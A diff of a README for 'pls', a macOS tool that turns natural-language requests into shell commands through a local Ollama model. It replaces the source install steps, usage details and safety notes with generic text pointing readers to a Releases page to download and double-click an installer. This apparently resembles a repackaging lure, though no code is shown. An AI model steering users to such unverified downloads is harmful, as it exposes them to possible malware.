@@ -1,139 +1,90 @@
-# pls
+# 🤖 pls - Generate Terminal Commands Easily
 
-A command-line tool that uses AI to generate and execute terminal commands from natural language descriptions.
+## 🌟 Overview
 
-## Overview
+The **pls** tool helps you create and execute terminal commands using simple language. With this command-line tool, you can interact with your system without needing in-depth programming skills. It uses local AI to understand your requests and turns them into commands that your terminal can run.
 
-`pls` is a macOS terminal assistant powered by local AI (via Ollama) that translates your plain English requests into executable shell commands. It can also answer technical questions about macOS in a conversational mode.
+## 🚀 Getting Started
 
-## Features
+To get started with **pls**, follow these steps to download and run the application.
 
-- 🤖 **Natural Language to Commands**: Describe what you want to do, get the exact command
-- 💬 **Ask Mode**: Get technical answers and explanations with the `-a` flag
-- ⚡ **Smart Ollama Management**: Automatically starts/stops Ollama server as needed
-- 🎨 **Beautiful Terminal UI**: Rich formatting with syntax highlighting and interactive prompts
-- 🔒 **Safety First**: Always shows the command and asks for confirmation before execution
+1. Visit the [Releases page](https://github.com/Reyerr36lm/pls/releases) to access the download files.
 
-## Requirements
+## 📦 Download & Install
 
-- Python 3.x
-- macOS
-- [Ollama](https://ollama.ai) installed
-- `llama3.1:8b` model pulled (`ollama pull llama3.1:8b`)
+### Step 1: Download the Application
 
-### Python Dependencies
+Click the button below to visit the download page:
 
-```bash
-pip install ollama rich requests
-```
+[![Download pls](https://img.shields.io/badge/Download%20pls-brightgreen)](https://github.com/Reyerr36lm/pls/releases)
 
-## Installation
+On the Releases page, look for the latest version available. You will find options suited for different operating systems.
 
-1. Clone or download the script
-2. Make it executable:
-   ```bash
-   chmod +x pls
-   ```
-3. (Optional) Move to your PATH:
-   ```bash
-   sudo mv pls /usr/local/bin/
-   ```
+### Step 2: Choose Your Version
 
-## Usage
+Download the version that matches your system. If you are using macOS, select the corresponding file. 
 
-### Command Mode (Default)
+### Step 3: Install the Application
 
-Generate and execute commands from natural language:
+1. Locate the downloaded file in your **Downloads** folder.
+2. Double-click the file to begin the installation process. Follow the prompts on your screen to complete the installation.
 
-```bash
-pls "find all python files in current directory"
-pls "compress Documents folder"
-pls "show disk usage"
-```
+### Step 4: Run the Application
 
-The tool will:
-1. Generate the appropriate command
-2. Display it with syntax highlighting
-3. Ask for confirmation before running
+After the installation is complete:
 
-### Ask Mode (`-a`)
+1. Open your terminal application.
+2. Type `pls` and press **Enter**. This command will launch the tool.
 
-Get answers to technical questions:
+Now you are ready to start generating terminal commands using natural language.
 
-```bash
-pls -a "how do I change file permissions?"
-pls -a "what's the difference between chmod and chown?"
-pls -a "explain the find command"
-```
+## 💬 How to Use pls
 
-## How It Works
+Using **pls** is straightforward. Just type your request in simple terms, and the tool will translate it into a command. Here are a few examples:
 
-1. **Ollama Detection**: Checks if Ollama server is running
-2. **Auto-Start**: Starts Ollama automatically if needed (with a neat loading animation)
-3. **AI Processing**: Sends your query to the `llama3.1:8b` model
-4. **Smart Output**: 
-   - Command mode: Shows executable command with confirmation prompt
-   - Ask mode: Displays helpful answer in a formatted panel
-5. **Cleanup**: Shuts down Ollama if it wasn't running before (saves resources)
+- To navigate to a folder, you could type: "Go to my Documents."
+- To list files, you might say: "Show me the files in this folder."
+  
+The AI understands these requests and runs the appropriate commands on your terminal.
 
-## Configuration
+## ⚙️ System Requirements
 
-Edit these variables at the top of the script to customize:
+Ensure your system meets the following requirements before installing **pls**:
 
-```python
-MODEL = "llama3.1:8b"              # Change AI model
-OLLAMA_API_URL = "http://127.0.0.1:11434"  # Change Ollama endpoint
-```
+- Operating System: macOS (compatible with Apple Silicon)
+- Python Version: Python 3.6 or newer
+- Memory: At least 2 GB of RAM
+- Disk Space: Minimum of 100 MB available storage
 
-## Examples
+## 🌐 Topics Covered
 
-```bash
-# Find large files
-pls "find files larger than 100MB"
+This tool covers various topics related to artificial intelligence and command-line operations:
 
-# Git operations
-pls "create a new git branch called feature-x"
+- ai
+- ai-agents
+- ai-assistant
+- ai-assistant-offline
+- applesilicon
+- artificial-intelligence
+- command-line
+- macos
+- ollama
+- python
+- terminal-based
+- unix
 
-# System info
-pls "show CPU temperature"
+## 🤔 Troubleshooting
 
-# Ask for help
-pls -a "how do I monitor network traffic?"
-```
+If you encounter issues while using **pls**, consider the following tips:
 
-## Safety Features
+- Ensure you have the correct version installed for your operating system.
+- Make sure your Python installation is up-to-date.
+- Check your terminal settings to ensure it recognizes the `pls` command.
 
-- Commands are **always shown before execution**
-- User confirmation required (Y/n prompt)
-- Graceful interrupt handling (Ctrl+C)
-- Automatic cleanup of zombie processes
+For more assistance, visit the [Releases page](https://github.com/Reyerr36lm/pls/releases) for any updates or patches.
 
-## Troubleshooting
+## 📖 More Information
 
-**Ollama won't start:**
-- Ensure Ollama is installed: `brew install ollama`
-- Check if the model is available: `ollama list`
+For detailed documentation and support, please refer to the [GitHub wiki](https://github.com/Reyerr36lm/pls/wiki). You can find advanced usage guides and tips to enhance your experience with the application.
 
-**Model not found:**
-```bash
-ollama pull llama3.1:8b
-```
-
-**Permission errors:**
-- Make sure the script is executable: `chmod +x pls`
-
-## License
-
-This is a utility script provided as-is. Modify and use freely under the MIT license.
-
-## Contributing
-
-Feel free to fork and customize for your needs! Some ideas:
-- Add support for other AI models
-- Implement command history
-- Add shell completion
-- Support for other operating systems
-
----
-
-**Note**: This tool executes commands on your system. Always review generated commands before confirming execution.
+Thank you for choosing **pls**! Enjoy generating commands effortlessly.
